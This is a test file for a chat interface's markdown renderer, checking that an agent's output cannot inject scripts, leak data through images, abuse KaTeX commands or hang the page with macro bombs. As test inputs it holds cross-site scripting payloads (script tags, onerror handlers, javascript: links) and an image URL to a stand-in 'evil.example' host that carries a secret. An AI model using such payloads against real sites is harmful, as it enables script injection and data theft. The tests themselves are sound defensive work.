// @vitest-environment jsdom
import {
  AssistantRuntimeProvider,
  type ThreadMessageLike,
  ThreadPrimitive,
  useExternalStoreRuntime,
} from "@assistant-ui/react";
import { act, cleanup, render, screen, waitFor } from "@testing-library/react";
import katex from "katex";
import { afterEach, describe, expect, it, vi } from "vitest";
import { TooltipProvider } from "@/components/ui/tooltip";
import * as highlight from "@/lib/highlight";
import { MAX_FORMULA_CHARS } from "@/lib/remark-display-math";
import { AssistantMessage } from "./thread.aui";

afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
});

/** Renders `text` as an agent message through the real message component (no viewport). */
function Harness({ text, createdAt }: { text: string; createdAt?: Date }) {
  const message: ThreadMessageLike = {
    id: "msg-1",
    role: "assistant",
    content: [
      // who ran (the marker ThreadAgent puts in front of an invocation's output)
      ...(createdAt
        ? [{ type: "data" as const, name: "vymalo.actor", data: { type: "agent", name: "coder" } }]
        : []),
      { type: "text", text },
    ],
    status: { type: "complete", reason: "stop" },
    ...(createdAt ? { createdAt } : {}),
  };
  const runtime = useExternalStoreRuntime<ThreadMessageLike>({
    messages: [message],
    convertMessage: (m) => m,
    isRunning: false,
    onNew: async () => {},
  });
  return (
    <AssistantRuntimeProvider runtime={runtime}>
      <TooltipProvider>
        <ThreadPrimitive.Root>
          <div role="log" aria-label="Conversation">
            <ThreadPrimitive.Messages>{() => <AssistantMessage />}</ThreadPrimitive.Messages>
          </div>
        </ThreadPrimitive.Root>
      </TooltipProvider>
    </AssistantRuntimeProvider>
  );
}

async function renderAgentText(text: string): Promise<HTMLElement> {
  render(<Harness text={text} />);
  const log = await screen.findByRole("log", { name: "Conversation" });
  await waitFor(() => expect(log.querySelector(".aui-md")).not.toBeNull());
  return log;
}

describe("MarkdownText", () => {
  it("renders markdown (sanity check for the tests below)", async () => {
    const log = await renderAgentText("**bold** and a [link](https://example.com/x)");
    expect(log.querySelector("strong")?.textContent).toBe("bold");
    const link = log.querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://example.com/x");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
  });

  it("agent markdown cannot inject script or javascript: links", async () => {
    const log = await renderAgentText(
      [
        "<script>window.__pwned = 1</script>",
        '<img src=x onerror="window.__pwned = 2">',
        '<a href="javascript:window.__pwned=3">raw html link</a>',
        "[markdown link](javascript:window.__pwned=4)",
        "[data link](data:text/html;base64,PHNjcmlwdD48L3NjcmlwdD4=)",
      ].join("\n\n"),
    );
    expect(log.querySelector("script")).toBeNull();
    expect(log.querySelector("img")).toBeNull();
    // raw HTML is shown as text, never parsed: no element carries an event-handler attribute
    for (const el of log.querySelectorAll("*")) {
      const handlers = el.getAttributeNames().filter((n) => n.startsWith("on"));
      expect(handlers, `<${el.localName}> attributes`).toEqual([]);
    }
    expect(log.textContent).toContain("<script>window.__pwned = 1</script>");
    for (const a of log.querySelectorAll("a")) {
      const href = a.getAttribute("href") ?? "";
      expect(href, `href of "${a.textContent}"`).not.toMatch(/^\s*(javascript|data|vbscript):/i);
    }
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });

  it("an image is never fetched: its alt text, and a link only for an http(s) URL", async () => {
    const log = await renderAgentText(
      [
        "![the diagram](https://evil.example/p.png?d=secret)",
        "![](https://evil.example/q.png)",
        "![bad](javascript:window.__pwned=5)",
        "[![nested](https://evil.example/r.png)](https://example.com/page)",
      ].join("\n\n"),
    );
    expect(log.querySelector("img, picture, source, image")).toBeNull();
    expect(document.querySelector('link[rel="preload"], link[rel="prefetch"]')).toBeNull();
    const link = [...log.querySelectorAll("a")].find((a) => a.textContent?.includes("the diagram"));
    expect(link?.getAttribute("href")).toBe("https://evil.example/p.png?d=secret");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
    // no alt text: it is still said to be an image
    expect(log.textContent).toContain("image");
    // a script URL is no link
    for (const a of log.querySelectorAll("a")) {
      expect(a.getAttribute("href") ?? "").not.toMatch(/^\s*javascript:/i);
    }
    expect(log.textContent).toContain("bad");
    // an image inside a link is its text, inside the one link
    const page = [...log.querySelectorAll("a")].find(
      (a) => a.getAttribute("href") === "https://example.com/page",
    );
    expect(page?.textContent).toContain("nested");
    expect(page?.querySelector("a")).toBeNull();
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });

  it("a fenced block is highlighted by its language, and says the same text", async () => {
    const source = 'fn main() {\n    println!("hi");\n}';
    const log = await renderAgentText(`Here:\n\n\`\`\`rust\n${source}\n\`\`\`\n`);
    const code = () => log.querySelector("pre code") as HTMLElement;
    expect(code().textContent).toBe(`${source}\n`);
    await waitFor(() => expect(code().querySelector("[data-token]")).not.toBeNull(), {
      timeout: 5000,
    });
    expect(code().textContent).toBe(`${source}\n`);
    expect(log.querySelector(".aui-code-header-language")?.textContent).toBe("rust");
  });

  it("a fence of an unknown language, and one with none, stay plain text", async () => {
    const log = await renderAgentText("```brainfuck\n+++[>+<-]\n```\n\n```\nplain words\n```\n");
    await new Promise((r) => setTimeout(r, 300));
    const blocks = [...log.querySelectorAll("pre code")];
    expect(blocks.map((b) => b.textContent)).toEqual(["+++[>+<-]\n", "plain words\n"]);
    for (const block of blocks) expect(block.querySelector("[data-token]")).toBeNull();
  });

  it("a fence that is still open (a streaming answer) renders", async () => {
    const log = await renderAgentText("```rust\nfn main() {");
    expect(log.querySelector("pre code")?.textContent?.trimEnd()).toBe("fn main() {");
  });

  it("inline code is not highlighted", async () => {
    const log = await renderAgentText("call `fn main()` now");
    await new Promise((r) => setTimeout(r, 300));
    const code = log.querySelector(".aui-md-inline-code");
    expect(code?.textContent).toBe("fn main()");
    expect(code?.querySelector("[data-token]")).toBeNull();
  });

  it("display math is drawn by KaTeX as MathML for a screen reader and HTML for the eye, with no raw TeX as a label", async () => {
    const log = await renderAgentText("The energy:\n\n$$\nE = mc^2\n$$\n");
    const math = await waitFor(() => {
      const el = log.querySelector<HTMLElement>(".katex-display");
      expect(el).not.toBeNull();
      return el as HTMLElement;
    });
    // MathML is exposed, the picture of it is not, and nothing names the formula by its source
    expect(math.querySelector("math")).not.toBeNull();
    expect(math.querySelector(".katex-html")?.getAttribute("aria-hidden")).toBe("true");
    expect(math.querySelector(".katex-mathml")?.getAttribute("aria-hidden")).toBeNull();
    expect(log.querySelector("[aria-label='E = mc^2']")).toBeNull();
    for (const el of log.querySelectorAll(".katex-display, .katex")) {
      expect(el.getAttribute("aria-label")).toBeNull();
      expect(el.getAttribute("role")).toBeNull();
    }
    // it fits (jsdom has no layout), so it is not a tab stop
    expect(math.getAttribute("tabindex")).toBeNull();
  });

  it("a formula that is a paragraph by itself is display math, and a failing one is shown, not thrown", async () => {
    const log = await renderAgentText("so:\n\n$$x^2$$\n\nand:\n\n$$\\frac{$$\n");
    await waitFor(() => expect(log.querySelectorAll(".katex-display").length).toBeGreaterThan(0));
    // the formula KaTeX cannot read is its source, in the page's own error colour (not KaTeX's red)
    const broken = await waitFor(() => {
      const el = log.querySelector<HTMLElement>(".katex-error");
      expect(el).not.toBeNull();
      return el as HTMLElement;
    });
    expect(broken.textContent).toBe("\\frac{");
    expect(broken.getAttribute("style")).toContain("var(--destructive)");
  });

  it("`$$` inside a sentence is text, exactly as written, with the math plugins loaded or not", async () => {
    const pid = "In bash, $$ is the pid; print $$ twice.";
    const price = "pay $5 $$ or $10 $$ tomorrow";
    const before = await renderAgentText(`${pid}\n\n${price}`);
    expect(before.querySelector(".katex, .katex-error")).toBeNull();
    expect(before.textContent).toContain(pid);
    expect(before.textContent).toContain(price);
    cleanup();

    // an answer that also holds a real formula loads KaTeX: the sentences around it stay sentences
    const after = await renderAgentText(`${pid}\n\n$$\nx^2\n$$\n\n${price}`);
    await waitFor(() => expect(after.querySelectorAll(".katex-display").length).toBe(1));
    expect(after.querySelector(".katex-error")).toBeNull();
    expect(after.querySelectorAll(".katex").length).toBe(1);
    expect(after.textContent).toContain(pid);
    expect(after.textContent).toContain(price);
  });

  it("`$$` in inline code and in a fence stays code", async () => {
    const log = await renderAgentText(
      [
        "Use `$$` for the pid, as in `echo $$ and $$`.",
        "",
        "```bash",
        "echo $$",
        "$$",
        "echo $$",
        "```",
        "",
        "And a real one:",
        "",
        "$$",
        "x^2",
        "$$",
      ].join("\n"),
    );
    await waitFor(() => expect(log.querySelectorAll(".katex-display").length).toBe(1));
    expect(log.querySelectorAll(".katex").length).toBe(1);
    expect(log.querySelector(".katex-error")).toBeNull();
    const inline = [...log.querySelectorAll(".aui-md-inline-code")].map((c) => c.textContent);
    expect(inline).toEqual(["$$", "echo $$ and $$"]);
    expect(log.querySelector("pre code")?.textContent).toBe("echo $$\n$$\necho $$\n");
  });

  it("a `$$` fence that is not closed yet (a streaming answer) is text, not a flash of error", async () => {
    const log = await renderAgentText("Here:\n\n$$\n\\frac{a}{");
    await new Promise((r) => setTimeout(r, 300));
    expect(log.querySelector(".katex, .katex-error")).toBeNull();
    expect(log.textContent).toContain("\\frac{a}{");
  });

  it("dollar prices are not read as math, with the math plugins loaded or not", async () => {
    const before = await renderAgentText("It costs $5 or $10, and $20 more later.");
    expect(before.querySelector(".katex")).toBeNull();
    expect(before.textContent).toContain("It costs $5 or $10, and $20 more later.");
    cleanup();

    const after = await renderAgentText("It costs $5 or $10, and $20 more.\n\n$$x^2$$\n\nThen $7.");
    await waitFor(() => expect(after.querySelectorAll(".katex").length).toBe(1));
    expect(after.textContent).toContain("It costs $5 or $10, and $20 more.");
    expect(after.textContent).toContain("Then $7.");
  });

  it("KaTeX trusts nothing: no id, link, image or style comes out of a formula, and the commands show as errors", async () => {
    const log = await renderAgentText(
      String.raw`$$\htmlId{root}{x}\htmlStyle{color:red}{y}\href{https://e.x}{z}\includegraphics{a.png}$$`,
    );
    const formula = await waitFor(() => {
      const el = log.querySelector<HTMLElement>(".katex-display");
      expect(el).not.toBeNull();
      return el as HTMLElement;
    });
    expect(document.getElementById("root")).toBeNull();
    expect(log.querySelector("[id='root']")).toBeNull();
    expect(log.querySelector("a[href], img")).toBeNull();
    expect(formula.querySelector("a, img")).toBeNull();
    for (const el of log.querySelectorAll("[style]")) {
      expect(el.getAttribute("style"), "style attribute").not.toMatch(/red/i);
    }
    // each command is refused and drawn as its own name, in the error colour
    const refused = [
      ...formula.querySelectorAll<HTMLElement>(".katex-html [style*='destructive']"),
    ];
    expect(refused.map((el) => el.textContent)).toEqual(
      expect.arrayContaining(["\\htmlId", "\\htmlStyle", "\\href", "\\includegraphics"]),
    );
  });

  it("a macro bomb is cut: an expansion that never ends, or that is only too long, is an error shown in 2 s", async () => {
    const started = Date.now();
    const log = await renderAgentText(
      [
        String.raw`$$\def\a{\a\a}\a$$`,
        // finite, but 1 + 10 + 100 + 1000 expansions, over the bound of 1000
        String.raw`$$\def\a{\b\b\b\b\b\b\b\b\b\b}\def\b{\c\c\c\c\c\c\c\c\c\c}\def\c{\d\d\d\d\d\d\d\d\d\d}\def\d{x}\a$$`,
      ].join("\n\n"),
    );
    await waitFor(() => expect(log.querySelectorAll(".katex-error").length).toBe(2), {
      timeout: 2000,
    });
    expect(Date.now() - started).toBeLessThan(2500);
    for (const error of log.querySelectorAll(".katex-error")) {
      expect(error.getAttribute("title")).toContain("Too many expansions");
    }
  });

  it("a formula over the size limit is shown as code, and KaTeX is never asked to draw it", async () => {
    const spy = vi.spyOn(katex, "renderToString");
    const big = "x+".repeat(MAX_FORMULA_CHARS / 2 + 1);
    expect(big.length).toBeGreaterThan(MAX_FORMULA_CHARS);
    const log = await renderAgentText(`Huge:\n\n$$\n${big}\n$$\n\nand a small one:\n\n$$\ny\n$$\n`);
    // the small one is drawn, so the plugins are in and the big one has had its chance
    await waitFor(() => expect(log.querySelectorAll(".katex-display").length).toBe(1));
    expect(log.querySelector("pre code")?.textContent).toBe(`${big}\n`);
    expect(spy).toHaveBeenCalledTimes(1);
    expect(spy.mock.calls[0]?.[0]).toBe("y");
  });

  it("a block of code over the size limit stays plain, and the highlighter is never asked", async () => {
    const spy = vi.spyOn(highlight, "highlightCode");
    const big = `let x = ${"1 + ".repeat(highlight.MAX_CODE_CHARS / 4)}1;`;
    const log = await renderAgentText(`\`\`\`rust\n${big}\n\`\`\`\n`);
    await new Promise((r) => setTimeout(r, 400));
    const code = log.querySelector("pre code") as HTMLElement;
    expect(code.textContent).toBe(`${big}\n`);
    expect(code.querySelector("[data-token]")).toBeNull();
    expect(spy).not.toHaveBeenCalled();
  });

  it("a display formula is a tab stop only while it is wider than its column", async () => {
    const width = { scroll: 400, client: 100 };
    const scroll = vi.spyOn(Element.prototype, "scrollWidth", "get").mockImplementation(function (
      this: Element,
    ) {
      return this.classList.contains("katex-display") ? width.scroll : 0;
    });
    const client = vi.spyOn(Element.prototype, "clientWidth", "get").mockImplementation(function (
      this: Element,
    ) {
      return this.classList.contains("katex-display") ? width.client : 0;
    });
    try {
      const log = await renderAgentText("$$\nx^2\n$$");
      const formula = await waitFor(() => {
        const el = log.querySelector<HTMLElement>(".katex-display");
        expect(el?.getAttribute("tabindex")).toBe("0");
        return el as HTMLElement;
      });
      expect(formula.getAttribute("role")).toBe("group");
      expect(formula.getAttribute("aria-label")).toBe("Formula");

      // the column widens: the formula fits, and the tab stop goes (the observers read it again)
      width.scroll = 100;
      await act(async () => {
        log.querySelector(".aui-md")?.appendChild(document.createElement("span"));
        await new Promise((r) => setTimeout(r, 0));
      });
      await waitFor(() => expect(formula.getAttribute("tabindex")).toBeNull());
      expect(formula.getAttribute("role")).toBeNull();
    } finally {
      scroll.mockRestore();
      client.mockRestore();
    }
  });

  it("the time of a turn is text a screen reader reaches, not only a tooltip", async () => {
    const at = new Date("2026-09-30T10:00:00Z");
    render(<Harness text="hello" createdAt={at} />);
    const log = await screen.findByRole("log", { name: "Conversation" });
    await waitFor(() =>
      expect(log.querySelector("[data-slot='message-time'] time")).not.toBeNull(),
    );
    const time = log.querySelector("[data-slot='message-time'] time") as HTMLTimeElement;
    expect(time.getAttribute("datetime")).toBe(at.toISOString());
    expect(time.textContent).toBe(at.toLocaleString());
    expect(time.closest(".sr-only")).not.toBeNull();
  });
});
